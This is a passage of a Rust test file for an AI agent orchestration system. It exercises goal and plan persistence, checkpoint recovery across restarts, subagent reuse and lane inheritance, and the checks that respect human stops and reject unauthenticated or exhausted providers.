
#[async_trait::async_trait]
impl crate::AgentTurnExecutor for CanonicalDogfoodExecutor {
    async fn execute(
        &self,
        turn: crate::AgentTurn,
        events: mpsc::Sender<SessionEventKind>,
        _controls: Option<mpsc::Receiver<crate::AgentTurnControl>>,
    ) -> Result<crate::AgentTurnResult> {
        // The canonical fixture performs several store-backed tool calls
        // before it can produce its assistant result. Announce provider
        // progress first so the test-only setup watchdog does not mistake
        // durable tool work for a dead provider under CI load.
        events
            .send(SessionEventKind::ProviderEvent {
                provider: CodingProvider::Codex,
                kind: "test_turn_started".to_string(),
                payload: json!({}),
            })
            .await
            .context("canonical dogfood executor could not announce progress")?;
        let phase = self.phase.fetch_add(1, Ordering::SeqCst);
        let final_text = match phase {
            0 => {
                let goal = turn
                    .agent_tools
                    .call(
                        "create_goal",
                        json!({
                            "objective": "dogfood the canonical persistent workspace",
                            "token_budget": 10_000
                        }),
                    )
                    .await?;
                let goal_id = goal["goal"]["id"]
                    .as_str()
                    .context("created goal did not return an id")?
                    .to_string();

                let plan = turn
                    .agent_tools
                    .call(
                        "update_plan",
                        json!({
                            "plan": [{
                                "content": "retrieve, verify, checkpoint, and recover durable state",
                                "status": "in_progress"
                            }]
                        }),
                    )
                    .await?;
                let plan_id = plan["items"][0]["id"]
                    .as_str()
                    .context("created plan did not return an id")?
                    .to_string();

                let index = turn
                    .agent_tools
                    .call("history_index", json!({"after_sequence": 0, "limit": 100}))
                    .await?;
                let indexed_event_id = index["documents"]
                    .as_array()
                    .and_then(|documents| {
                        documents.iter().find_map(|document| {
                            document["content"]
                                .as_str()
                                .filter(|content| content.contains("lossless-dogfood"))
                                .and_then(|_| document["event_id"].as_str())
                        })
                    })
                    .context("canonical history index did not contain the prompt")?
                    .to_string();

                let adapter = turn
                    .agent_tools
                    .call(
                        "create_retrieval_adapter",
                        json!({
                            "id": "canonical-dogfood",
                            "description": "Find durable session events through the canonical history index",
                            "source": "def retrieve(query):\n    page = borg.history_index(0, 100)\n    return {'query': query, 'event_ids': [row['event_id'] for row in page['documents'] if query and query in row['content']]}\n",
                            "tests": "def test(retrieve, borg):\n    result = retrieve('lossless-dogfood')\n    assert result['event_ids'], result\n    return {'found': len(result['event_ids'])}\n"
                        }),
                    )
                    .await?;
                let adapter_revision = adapter["revision"]
                    .as_str()
                    .context("created retrieval adapter did not return a revision")?
                    .to_string();

                let tested = turn
                    .agent_tools
                    .call(
                        "runtime_exec",
                        json!({
                            "runtime": "python",
                            "code": "borg.test_retrieval_adapter('canonical-dogfood')"
                        }),
                    )
                    .await?;
                anyhow::ensure!(
                    tested["value"]["passed"] == true,
                    "model-authored retrieval adapter test failed: {tested}"
                );

                let retrieved = turn
                    .agent_tools
                    .call(
                        "runtime_exec",
                        json!({
                            "runtime": "python",
                            "code": "borg.retrieval_adapter('canonical-dogfood', 'lossless-dogfood')"
                        }),
                    )
                    .await?;
                let retrieved_event_id = retrieved["value"]["event_ids"]
                    .as_array()
                    .and_then(|ids| ids.first())
                    .and_then(Value::as_str)
                    .context("retrieval adapter returned no canonical event id")?
                    .to_string();
                anyhow::ensure!(
                    retrieved_event_id == indexed_event_id,
                    "adapter did not preserve the indexed canonical locator"
                );

                let resolved = turn
                    .agent_tools
                    .call(
                        "query_history",
                        json!({"event_id": retrieved_event_id, "limit": 1}),
                    )
                    .await?;
                anyhow::ensure!(
                    resolved["hits"]
                        .as_array()
                        .is_some_and(|hits| !hits.is_empty()),
                    "retrieved history locator did not resolve canonically"
                );

                let checkpoint_state = json!({
                    "goal_id": goal_id,
                    "plan_id": plan_id,
                    "adapter_revision": adapter_revision,
                    "history_event_id": retrieved_event_id,
                    "cursor": index["next_after_sequence"]
                });
                let checkpoint_code = format!(
                    "borg.checkpoint('canonical-dogfood', {})",
                    serde_json::to_string(&checkpoint_state)?
                );
                let checkpoint = turn
                    .agent_tools
                    .call(
                        "runtime_exec",
                        json!({"runtime": "python", "code": checkpoint_code}),
                    )
                    .await?;
                anyhow::ensure!(
                    checkpoint["value"]["key"] == "canonical-dogfood",
                    "runtime checkpoint was not persisted"
                );
                serde_json::to_string(&json!({
                    "phase": 1,
                    "goal_id": goal_id,
                    "plan_id": plan_id,
                    "event_id": retrieved_event_id
                }))?
            }
            1 => {
                let goal = turn.agent_tools.call("get_goal", json!({})).await?;
                anyhow::ensure!(
                    goal["goal"]["status"] == "active",
                    "goal was not recovered as active: {goal}"
                );
                let plan = turn.agent_tools.call("get_plan", json!({})).await?;
                let plan_id = plan["items"][0]["id"]
                    .as_str()
                    .context("recovered plan did not contain its id")?
                    .to_string();

                let status = turn
                    .agent_tools
                    .call(
                        "runtime_exec",
                        json!({
                            "runtime": "python",
                            "code": "borg.runtime_status()"
                        }),
                    )
                    .await?;
                anyhow::ensure!(
                    status["recovered_from_manifest"] == true,
                    "runtime did not report recovery from the prior worker: {status}"
                );
                let automatically_restored = turn
                    .agent_tools
                    .call(
                        "runtime_exec",
                        json!({
                            "runtime": "python",
                            "code": "plan_id"
                        }),
                    )
                    .await?;
                anyhow::ensure!(
                    automatically_restored["value"] == plan_id,
                    "checkpoint namespace was not automatically rehydrated: {automatically_restored}"
                );
                let restored = turn
                    .agent_tools
                    .call(
                        "runtime_exec",
                        json!({
                            "runtime": "python",
                            "code": "borg.restore('canonical-dogfood')"
                        }),
                    )
                    .await?;
                anyhow::ensure!(
                    restored["value"]["state"]["plan_id"] == plan_id,
                    "checkpoint did not restore the durable plan identity: {restored}"
                );

                let retrieved = turn
                    .agent_tools
                    .call(
                        "runtime_exec",
                        json!({
                            "runtime": "python",
                            "code": "borg.retrieval_adapter('canonical-dogfood', 'lossless-dogfood')"
                        }),
                    )
                    .await?;
                anyhow::ensure!(
                    retrieved["value"]["event_ids"]
                        .as_array()
                        .is_some_and(|ids| !ids.is_empty()),
                    "persisted retrieval adapter did not work after restart"
                );

                turn.agent_tools
                    .call(
                        "update_plan",
                        json!({
                            "plan": [{
                                "id": plan_id,
                                "content": "retrieve, verify, checkpoint, and recover durable state",
                                "status": "completed"
                            }]
                        }),
                    )
                    .await?;
                let completed = turn
                    .agent_tools
                    .call("update_goal", json!({"status": "complete"}))
                    .await?;
                anyhow::ensure!(
                    completed["goal"]["status"] == "complete",
                    "goal did not reach its terminal state: {completed}"
                );
                "{\"phase\":2,\"recovered\":true}".to_string()
            }
            other => anyhow::bail!("unexpected dogfood executor phase {other}"),
        };

        events
            .send(SessionEventKind::Message {
                message_id: Uuid::new_v4(),
                actor: EventActor::Assistant,
                text: final_text.clone(),
                attachments: Vec::new(),
                status: MessageStatus::Complete,
                delivery: None,
            })
            .await
            .context("dogfood executor event receiver closed")?;
        Ok(crate::AgentTurnResult {
            provider_session_id: Some("canonical-dogfood".to_string()),
            final_text,
        })
    }
}

async fn run_canonical_dogfood_actor(
    directory: &Path,
    session_id: Uuid,
    store: Arc<crate::session_store::postgres::PostgresSessionStore>,
    executor: Arc<dyn crate::AgentTurnExecutor>,
    send_prompt: bool,
) -> Result<Vec<crate::SessionEvent>> {
    let mut session_launch = launch();
    session_launch.cwd = directory.to_path_buf();
    session_launch.permission_mode = PermissionMode::FullAccess;
    session_launch.capabilities.subagents = false;
    session_launch.capabilities.multiplayer = false;

    let lock_path = directory.join(format!("{session_id}.lock"));
    let writer = crate::SessionWriterLease::acquire(&lock_path)?;
    let (command_tx, command_rx) = mpsc::channel(8);
    let (event_tx, mut event_rx) = mpsc::channel(1_024);
    let session_root = directory.to_path_buf();
    let actor = tokio::spawn(async move {
        crate::run_agent_session_with_store_and_writer(
            &session_root,
            session_id,
            session_launch,
            command_rx,
            event_tx,
            executor,
            store,
            writer,
        )
        .await
    });

    let message_id = send_prompt.then(Uuid::new_v4);
    if let Some(message_id) = message_id {
        command_tx
            .send(HostCommand::Prompt {
                session_id,
                message_id,
                text: "lossless-dogfood needle".to_string(),
                attachments: Vec::new(),
                output_schema: None,
                delivery: PromptDelivery::Queue,
            })
            .await
            .context("send canonical dogfood prompt")?;
    }

    let mut delivered = Vec::new();
    loop {
        let event = tokio::time::timeout(Duration::from_secs(30), event_rx.recv())
            .await
            .context("timed out waiting for canonical dogfood turn")?
            .context("canonical dogfood actor closed its event stream")?;
        let completed = matches!(
            &event.kind,
            SessionEventKind::TurnCompleted {
                message_id: completed_id,
                error: None,
                ..
            } if message_id.is_none_or(|message_id| *completed_id == message_id)
        );
        delivered.push(event);
        if completed {
            break;
        }
    }

    command_tx
        .send(HostCommand::Stop { session_id })
        .await
        .context("stop canonical dogfood actor")?;
    drop(command_tx);
    tokio::time::timeout(Duration::from_secs(30), actor)
        .await
        .context("timed out stopping canonical dogfood actor")??
        .context("canonical dogfood actor task failed")?;
    Ok(delivered)
}

#[tokio::test]
async fn canonical_runtime_dogfood_completes_goal_through_restart() {
    let command = std::env::var("BORG_PYTHON_RUNTIME").unwrap_or_else(|_| {
        if cfg!(windows) {
            "python".to_string()
        } else {
            "python3".to_string()
        }
    });
    if !tokio::process::Command::new(command)
        .arg("--version")
        .output()
        .await
        .is_ok_and(|output| output.status.success())
    {
        return;
    }

    let directory = tempdir().unwrap();
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let store = Arc::new(store);
    let session_id = Uuid::new_v4();
    store.create_session(session_id).await.unwrap();
    let executor = Arc::new(CanonicalDogfoodExecutor::new());

    let first_events = run_canonical_dogfood_actor(
        directory.path(),
        session_id,
        store.clone(),
        executor.clone(),
        true,
    )
    .await
    .unwrap();
    assert!(first_events.iter().any(|event| matches!(
        event.kind,
        SessionEventKind::TurnCompleted { error: None, .. }
    )));

    let second_events =
        run_canonical_dogfood_actor(directory.path(), session_id, store.clone(), executor, false)
            .await
            .unwrap();
    assert!(second_events.iter().any(|event| matches!(
        event.kind,
        SessionEventKind::TurnCompleted { error: None, .. }
    )));

    let state = store.state(session_id).await.unwrap();
    assert_eq!(state.goal.unwrap().status, crate::GoalStatus::Complete);
    assert_eq!(state.todos.len(), 1);
    assert_eq!(state.todos[0].status, crate::PlanItemStatus::Completed);
    assert!(
        store
            .runtime_checkpoint(session_id, Some("canonical-dogfood"))
            .await
            .unwrap()
            .unwrap()
            .state["cursor"]
            .as_u64()
            .is_some_and(|cursor| cursor > 0)
    );
    scratch.discard().await;
}

async fn bind_test_team(
    directory: &Path,
    store: &crate::session_store::postgres::PostgresSessionStore,
    root: Uuid,
    children: &[Uuid],
) {
    let workspace = store
        .workspace_store()
        .await
        .unwrap()
        .expect("session store exposes the canonical workspace projection");
    let human = crate::local_human_participant_id("Human");
    workspace
        .ensure_execution_workspace(root, "test team", human, "Human", root, "Director")
        .await
        .unwrap();
    for child in children {
        let lock_path = child_lock_path(directory, *child);
        let _writer = crate::SessionWriterLease::acquire(&lock_path).unwrap();
        store.register_child_session(root, *child).await.unwrap();
        workspace
            .ensure_execution_workspace(root, "test team", human, "Human", *child, "Worker")
            .await
            .unwrap();
    }
}

#[test]
fn child_identity_is_stable_and_inherits_execution_context() {
    let root = Uuid::new_v4();
    let mut table = SubagentTable {
        root_session_id: root,
        max_children: 2,
        entries: HashMap::new(),
        task_names: HashMap::new(),
    };
    let child = table.reserve("review_api", &launch()).unwrap();
    assert_eq!(child.parent_session_id, root);
    assert_eq!(child.task_name, "/root/review_api");
    assert_eq!(child.provider, CodingProvider::Codex);
    assert_eq!(child.model.as_deref(), Some("gpt-test"));
    assert_eq!(table.resolve("review_api").unwrap(), child.session_id);
    assert_eq!(table.resolve("/root/review_api").unwrap(), child.session_id);
    assert_eq!(
        table
            .resolve(&format!("session:{}", child.session_id))
            .unwrap(),
        child.session_id
    );
}

#[tokio::test]
async fn spawn_tool_reuses_a_compatible_ready_worker_for_a_new_task() {
    let directory = tempdir().unwrap();
    let root = Uuid::new_v4();
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let store = Arc::new(store);
    store.create_session(root).await.unwrap();
    let prompts = Arc::new(StdMutex::new(Vec::new()));
    let executor = RecordingPeerExecutor {
        prompts: Arc::clone(&prompts),
    };
    let mut root_launch = launch();
    root_launch.capabilities.multiplayer = false;
    root_launch.cwd = directory.path().to_path_buf();
    let coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory.path(),
        root,
        root_launch,
        1,
        Arc::new(executor),
        store,
    )
    .unwrap();

    let first = coordinator
        .call_tool(
            "spawn_agent",
            json!({
                "action": "delegate task",
                "task_name": "first_task",
                "message": "Complete the first bounded task."
            }),
        )
        .await
        .unwrap();
    let session_id = Uuid::parse_str(first["session_id"].as_str().unwrap()).unwrap();
    tokio::time::timeout(Duration::from_secs(2), async {
        loop {
            if coordinator.get(session_id).await.unwrap().status == SubagentStatus::Ready {
                break;
            }
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
    })
    .await
    .expect("first assignment should complete");

    // Subscribe before the reuse: the first turn's report has already been
    // broadcast, so the only assistant report this receiver sees belongs to
    // the second assignment.
    let mut activity = coordinator.subscribe();
    let second = coordinator
        .call_tool(
            "spawn_agent",
            json!({
                "action": "reuse worker",
                "task_name": "second_task",
                "message": "Complete the second bounded task."
            }),
        )
        .await
        .unwrap();
    assert_eq!(second["reused"], true);
    assert_eq!(second["assignment_task_name"], "/root/second_task");
    assert_eq!(second["session_id"], session_id.to_string());
    // The worker keeps its session, and therefore its conversation, but it
    // must take the new task's identity with it. The assignment used to
    // rewrite only `detail`, leaving the first task's name on the snapshot.
    assert_eq!(second["task_name"], "/root/second_task");
    assert_eq!(coordinator.list(None).await.len(), 1);
    assert_eq!(coordinator.list(Some("/root/second_task")).await.len(), 1);
    assert!(coordinator.list(Some("/root/first_task")).await.is_empty());

    tokio::time::timeout(Duration::from_secs(2), async {
        loop {
            if prompts.lock().unwrap().len() == 2 {
                break;
            }
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
    })
    .await
    .expect("reused worker should receive the second assignment");
    let recorded = prompts.lock().unwrap().clone();
    assert!(recorded[0].contains("first bounded task"));
    assert!(recorded[1].contains("second bounded task"));

    // The root projects a child report as `AgentMessageReceived` under the
    // task name carried on this activity. Capturing it once at spawn made a
    // reused worker answer the new task under the previous task's name.
    let reported_name = tokio::time::timeout(Duration::from_secs(2), async {
        loop {
            match activity.recv().await {
                Ok(SubagentActivity::SessionEvent {
                    task_name,
                    event:
                        SessionEvent {
                            kind:
                                SessionEventKind::Message {
                                    actor: EventActor::Assistant,
                                    status: MessageStatus::Complete,
                                    ..
                                },
                            ..
                        },
                    ..
                }) => break task_name,
                Ok(_) => continue,
                Err(error) => panic!("subagent activity stream ended: {error}"),
            }
        }
    })
    .await
    .expect("reused worker should report its second turn");
    assert_eq!(reported_name, "/root/second_task");
    assert_eq!(
        coordinator.get(session_id).await.unwrap().task_name,
        "/root/second_task"
    );

    // The name index moved with the worker: the first task's name is free
    // again rather than resolving to a worker that stopped running it.
    assert!(coordinator.stop("/root/first_task").await.is_err());
    coordinator.stop("/root/second_task").await.unwrap();

    coordinator.stop_all().await;
    scratch.discard().await;
}

/// A child spawned without a provider, or with a provider but no model, runs on
/// the lane its parent is on *now* rather than the lane the parent session was
/// launched on.
///
/// The failure this protects is a fan-out: a session that has switched provider
/// or model since it started hands every child the lane it was launched with, so
/// each child first fails on a route the parent is not even using
/// ("this session retains its Codex compatibility route") and then fails again
/// when the caller names a provider without a model ("OpenCode native sessions
/// require an explicit model"). The caller cannot tell the two apart from the
/// refusals, and every child dies before doing any work.
#[tokio::test]
async fn a_child_without_a_lane_inherits_the_parent_live_lane() {
    let directory = tempdir().unwrap();
    let root = Uuid::new_v4();
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let store = Arc::new(store);
    store.create_session(root).await.unwrap();

    // The session was launched on Codex, and the host it runs on offers the
    // provider it has since switched to.
    let mut root_launch = launch();
    root_launch.capabilities.multiplayer = false;
    root_launch.cwd = directory.path().to_path_buf();
    root_launch
        .capabilities
        .provider_capabilities
        .push(crate::ProviderCapability {
            provider: CodingProvider::OpenCode,
            installed: true,
            version: Some("test".to_string()),
            authenticated: true,
            auth_detail: Some("test credentials".to_string()),
            auth_methods: vec![crate::ProviderAuthMethod::Subscription],
            can_spawn: true,
            usage: None,
            billing: None,
        });
    // Its own turns have run on OpenCode since the switch: this is the lane the
    // parent is really on, and the one its children must inherit.
    store
        .append(SessionEvent::new(
            root,
            0,
            SessionEventKind::SessionConfigured {
                cwd: directory.path().to_path_buf(),
                provider: CodingProvider::OpenCode,
                model: Some("opencode-go/deepseek-v4.1-flash".to_string()),
                effort: None,
                fast: false,
                response_language: crate::ResponseLanguage::Auto,
                permission_mode: PermissionMode::Manual,
            },
        ))
        .await
        .unwrap();

    let prompts = Arc::new(StdMutex::new(Vec::new()));
    let coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory.path(),
        root,
        root_launch.clone(),
        2,
        Arc::new(RecordingPeerExecutor {
            prompts: Arc::clone(&prompts),
        }),
        store,
    )
    .unwrap();

    let defaulted = coordinator
        .subagent_launch(&SpawnSubagent {
            task_name: "defaulted".to_string(),
            message: "Complete the bounded task.".to_string(),
            provider: None,
            model: None,
            effort: None,
        })
        .await
        .expect("a child with no lane named resolves the parent lane");
    assert_ne!(
        defaulted.provider, root_launch.provider,
        "the launch lane is not the parent live lane"
    );
    assert_eq!(defaulted.provider, CodingProvider::OpenCode);
    assert_eq!(
        defaulted.model.as_deref(),
        Some("opencode-go/deepseek-v4.1-flash")
    );

    // Naming the provider without a model resolves the model with it, rather
    // than handing the child a provider it cannot run on.
    let named = coordinator
        .subagent_launch(&SpawnSubagent {
            task_name: "named_provider".to_string(),
            message: "Complete the bounded task.".to_string(),
            provider: Some(CodingProvider::OpenCode),
            model: None,
            effort: None,
        })
        .await
        .expect("a provider named without a model still resolves a lane");
    assert_eq!(named.provider, CodingProvider::OpenCode);
    assert_eq!(
        named.model.as_deref(),
        Some("opencode-go/deepseek-v4.1-flash")
    );

    // And the child actually runs: the whole path, through the tool the model
    // calls, reaches a turn on that lane.
    let spawned = coordinator
        .call_tool(
            "spawn_agent",
            json!({
                "action": "delegate task",
                "task_name": "inherit_lane",
                "message": "Complete the bounded task."
            }),
        )
        .await
        .unwrap();
    assert_eq!(spawned["provider"], "open_code", "{spawned}");
    assert_eq!(
        spawned["model"], "opencode-go/deepseek-v4.1-flash",
        "{spawned}"
    );
    let child = Uuid::parse_str(spawned["session_id"].as_str().unwrap()).unwrap();
    tokio::time::timeout(Duration::from_secs(2), async {
        loop {
            if coordinator.get(child).await.unwrap().status == SubagentStatus::Ready {
                break;
            }
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
    })
    .await
    .expect("the defaulted child should take its turn");
    assert!(
        prompts
            .lock()
            .unwrap()
            .iter()
            .any(|prompt| prompt.contains("bounded task")),
        "the child ran its assignment as a turn"
    );

    coordinator.stop_all().await;
    scratch.discard().await;
}

#[tokio::test]
async fn a_human_stopped_worker_is_not_reused_for_a_new_task() {
    // A human stop journals `Ready` in the same breath it latches the gate,
    // so a stopped worker was claimed here like any idle one. The assignment
    // then arrived as a team message -- and therefore as `System` -- which
    // the user-stop gate holds: the roster showed the new task name on a
    // worker that silently never ran it. Both halves matter. The stop must
    // survive untouched, and the new task must still get done.
    let directory = tempdir().unwrap();
    let root = Uuid::new_v4();
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let store = Arc::new(store);
    store.create_session(root).await.unwrap();
    let prompts = Arc::new(StdMutex::new(Vec::new()));
    let executor = RecordingPeerExecutor {
        prompts: Arc::clone(&prompts),
    };
    let mut root_launch = launch();
    root_launch.capabilities.multiplayer = false;
    root_launch.cwd = directory.path().to_path_buf();
    // Two slots, so declining to reuse can actually spawn instead of being
    // refused by the concurrency cap and passing for the wrong reason.
    let coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory.path(),
        root,
        root_launch,
        2,
        Arc::new(executor),
        store.clone(),
    )
    .unwrap();

    let first = coordinator
        .call_tool(
            "spawn_agent",
            json!({
                "action": "delegate task",
                "task_name": "first_task",
                "message": "Complete the first bounded task."
            }),
        )
        .await
        .unwrap();
    let stopped_session = Uuid::parse_str(first["session_id"].as_str().unwrap()).unwrap();
    tokio::time::timeout(Duration::from_secs(2), async {
        loop {
            if coordinator.get(stopped_session).await.unwrap().status == SubagentStatus::Ready {
                break;
            }
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
    })
    .await
    .expect("first assignment should complete");

    // The human interrupts this worker. Only the durable gate is engaged;
    // the roster status stays `Ready`, which is precisely what made the
    // worker claimable for someone else's task.
    store
        .append(SessionEvent::new(
            stopped_session,
            0,
            SessionEventKind::UserStopChanged { engaged: true },
        ))
        .await
        .unwrap();
    assert_eq!(
        coordinator.get(stopped_session).await.unwrap().status,
        SubagentStatus::Ready,
        "the stop leaves the worker Ready; the reuse gate cannot rely on status"
    );

    let second = coordinator
        .call_tool(
            "spawn_agent",
            json!({
                "action": "delegate task",
                "task_name": "second_task",
                "message": "Complete the second bounded task."
            }),
        )
        .await
        .unwrap();

    // The approved assignment is not swallowed: it runs on a fresh worker.
    assert_eq!(second["reused"], false);
    let second_session = Uuid::parse_str(second["session_id"].as_str().unwrap()).unwrap();
    assert_ne!(second_session, stopped_session);
    assert_eq!(second["assignment_task_name"], "/root/second_task");

    // The stop is not contaminated into the new task: the stopped worker
    // keeps its own identity, and the new name resolves to the new worker.
    assert_eq!(
        coordinator.get(stopped_session).await.unwrap().task_name,
        "/root/first_task"
    );
    assert_eq!(
        coordinator.get(second_session).await.unwrap().task_name,
        "/root/second_task"
    );
    assert!(
        store.state(stopped_session).await.unwrap().user_stopped,
        "the human stop must survive the handoff untouched"
    );

    coordinator.stop_all().await;
    scratch.discard().await;
}

/// A model switch must not rotate the worker, lose its conversation, or
/// revert to the launch lane when that child is resumed after a stop.
#[tokio::test]
async fn director_configures_live_child_and_reuses_its_new_lane_after_wake() {
    let directory = tempdir().unwrap();
    let root = Uuid::new_v4();
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let store = Arc::new(store);
    store.create_session(root).await.unwrap();
    let mut root_launch = launch();
    root_launch.cwd = directory.path().to_path_buf();
    let coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory.path(),
        root,
        root_launch,
        2,
        Arc::new(RecordingPeerExecutor::default()),
        store.clone(),
    )
    .unwrap();
    let child = coordinator
        .spawn(SpawnSubagent {
            task_name: "worker".into(),
            message: "Remember this original prompt.".into(),
            provider: Some(CodingProvider::Claude),
            model: Some("claude-opus-5-5".into()),
            effort: Some("high".into()),
        })
        .await
        .unwrap();
    let target = child.task_name.as_str();
    tokio::time::timeout(Duration::from_secs(5), async {
        while coordinator.get(child.session_id).await.unwrap().status != SubagentStatus::Ready {
            tokio::task::yield_now().await;
        }
    })
    .await
    .unwrap();

    let unauthorized = coordinator
        .call_tool_as(
            child.session_id,
            "configure_agent",
            json!({ "target": target, "provider": "codex" }),
        )
        .await
        .unwrap_err();
    assert!(unauthorized.to_string().contains("only the director"));
    assert!(
        coordinator
            .configure_child("/root", Some(CodingProvider::Codex), None, None)
            .await
            .unwrap_err()
            .to_string()
            .contains("not a child agent")
    );
    assert!(
        coordinator
            .configure_child(target, None, None, Some("invalid".into()))
            .await
            .is_err()
    );

    let configured = coordinator
        .call_tool_as(
            root,
            "configure_agent",
            json!({ "target": target, "provider": "codex", "model": "gpt-6-sol", "effort": "max" }),
        )
        .await
        .unwrap();
    assert_eq!(
        configured["agent"]["session_id"],
        child.session_id.to_string()
    );
    assert_eq!(configured["agent"]["provider"], "codex");
    assert_eq!(configured["agent"]["model"], "gpt-6-sol");
    assert_eq!(configured["agent"]["effort"], "max");
    let state = store.state(child.session_id).await.unwrap();
    let config = state.configuration.unwrap();
    assert_eq!(config.provider, CodingProvider::Codex);
    assert_eq!(config.model.as_deref(), Some("gpt-6-sol"));
    assert_eq!(config.effort.as_deref(), Some("max"));
    assert_eq!(
        state.latest_prompt.as_deref(),
        Some("Remember this original prompt.")
    );

    coordinator.stop(target).await.unwrap();
    tokio::time::timeout(Duration::from_secs(5), async {
        while coordinator.get(child.session_id).await.unwrap().status != SubagentStatus::Stopped {
            tokio::task::yield_now().await;
        }
    })
    .await
    .unwrap();
    coordinator
        .ensure_child_actor(child.session_id)
        .await
        .unwrap();
    let revived = coordinator.get(child.session_id).await.unwrap();
    assert_eq!(revived.session_id, child.session_id);
    assert_eq!(revived.provider, CodingProvider::Codex);
    assert_eq!(revived.model.as_deref(), Some("gpt-6-sol"));
    assert_eq!(revived.effort.as_deref(), Some("max"));
    coordinator.stop_all().await;
    scratch.discard().await;
}

#[tokio::test]
async fn ensuring_a_sidecar_reuses_one_idle_provider_session() {
    let directory = tempdir().unwrap();
    let root = Uuid::new_v4();
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let store = Arc::new(store);
    store.create_session(root).await.unwrap();
    let mut root_launch = launch();
    root_launch.capabilities.multiplayer = false;
    let coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory.path(),
        root,
        root_launch,
        3,
        Arc::new(crate::LocalAgentTurnExecutor::default()),
        store,
    )
    .unwrap();

    let first = coordinator
        .ensure_sidecar(
            "claude",
            CodingProvider::Claude,
            Some("claude-opus-5-5".to_string()),
            Some("high".to_string()),
        )
        .await
        .unwrap();
    let second = coordinator
        .ensure_sidecar(
            "claude",
            CodingProvider::Claude,
            Some("claude-opus-5-5".to_string()),
            Some("high".to_string()),
        )
        .await
        .unwrap();

    assert_eq!(first.session_id, second.session_id);
    assert_eq!(second.task_name, "/root/claude");
    assert_eq!(second.provider, CodingProvider::Claude);
    assert_eq!(second.model.as_deref(), Some("claude-opus-5-5"));
    assert_eq!(second.effort.as_deref(), Some("high"));

    coordinator.stop("/root/claude").await.unwrap();
    let resumed = coordinator
        .ensure_sidecar(
            "claude",
            CodingProvider::Claude,
            Some("claude-opus-5-5".to_string()),
            Some("high".to_string()),
        )
        .await
        .unwrap();
    assert_eq!(resumed.session_id, first.session_id);
    coordinator.stop("/root/claude").await.unwrap();
    scratch.discard().await;
}

#[tokio::test]
async fn rotating_a_sidecar_archives_the_old_identity_and_rebinds_the_lane() {
    let directory = tempdir().unwrap();
    let root = Uuid::new_v4();
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let store = Arc::new(store);
    store.create_session(root).await.unwrap();
    let mut root_launch = launch();
    root_launch.capabilities.multiplayer = false;
    root_launch.cwd = directory.path().to_path_buf();
    let coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory.path(),
        root,
        root_launch,
        3,
        Arc::new(crate::LocalAgentTurnExecutor::default()),
        store,
    )
    .unwrap();

    let first = coordinator
        .ensure_sidecar(
            "gpt",
            CodingProvider::Codex,
            Some("gpt-6-sol".to_string()),
            Some("xhigh".to_string()),
        )
        .await
        .unwrap();
    let rotation = coordinator
        .rotate_sidecar(
            "gpt",
            CodingProvider::Codex,
            Some("gpt-6-luna".to_string()),
            Some("max".to_string()),
        )
        .await
        .unwrap();

    let archived = coordinator
        .list(None)
        .await
        .into_iter()
        .find(|agent| agent.session_id == first.session_id)
        .expect("archived sidecar remains visible");
    assert_ne!(rotation.session_id, first.session_id);
    assert_eq!(rotation.task_name, "/root/gpt");
    assert_eq!(rotation.model.as_deref(), Some("gpt-6-luna"));
    assert_eq!(rotation.effort.as_deref(), Some("max"));
    assert_eq!(archived.session_id, first.session_id);
    assert!(archived.task_name.starts_with("/root/peer_archive_"));
    assert_eq!(archived.status, SubagentStatus::Stopped);
    assert_eq!(
        coordinator
            .resolve_snapshot(&archived.task_name)
            .await
            .unwrap()
            .session_id,
        first.session_id
    );
    assert_eq!(coordinator.list(None).await.len(), 2);

    coordinator.stop("/root/gpt").await.unwrap();
    scratch.discard().await;
}

#[tokio::test]
async fn subagent_admission_rejects_a_provider_without_host_authentication() {
    let directory = tempdir().unwrap();
    let root = Uuid::new_v4();
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let store = Arc::new(store);
    store.create_session(root).await.unwrap();
    let mut root_launch = launch();
    let claude = root_launch
        .capabilities
        .provider_capabilities
        .iter_mut()
        .find(|capability| capability.provider == CodingProvider::Claude)
        .unwrap();
    claude.authenticated = false;
    claude.auth_methods.clear();
    claude.can_spawn = false;
    claude.auth_detail = Some("Claude subscription is not authenticated".to_string());
    let coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory.path(),
        root,
        root_launch,
        2,
        Arc::new(crate::LocalAgentTurnExecutor::default()),
        store,
    )
    .unwrap();

    let error = coordinator
        .ensure_sidecar(
            "claude",
            CodingProvider::Claude,
            Some("claude-opus-5-5".to_string()),
            Some("high".to_string()),
        )
        .await
        .unwrap_err()
        .to_string();
    assert!(error.contains("Claude cannot spawn"));
    assert!(error.contains("not authenticated"));
    scratch.discard().await;
}

#[tokio::test]
async fn subagent_admission_rejects_an_exhausted_subscription() {
    let directory = tempdir().unwrap();
    let root = Uuid::new_v4();
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let store = Arc::new(store);
    store.create_session(root).await.unwrap();
    let mut root_launch = launch();
    let claude = root_launch
        .capabilities
        .provider_capabilities
        .iter_mut()
        .find(|capability| capability.provider == CodingProvider::Claude)
        .unwrap();
    claude.can_spawn = false;
    claude.usage = Some(crate::ProviderUsage {
        availability: crate::ProviderUsageAvailability::Exhausted,
        windows: vec![crate::ProviderUsageWindow {
            label: "5-hour".to_string(),
            used_percent: 100,
            resets_at: None,
            global: true,
        }],
        detail: Some("Claude subscription usage is exhausted".to_string()),
        plan: None,
    });
    let coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory.path(),
        root,
        root_launch,
        2,
        Arc::new(crate::LocalAgentTurnExecutor::default()),
        store,
    )
    .unwrap();

    let error = coordinator
        .ensure_sidecar(
            "claude",
            CodingProvider::Claude,
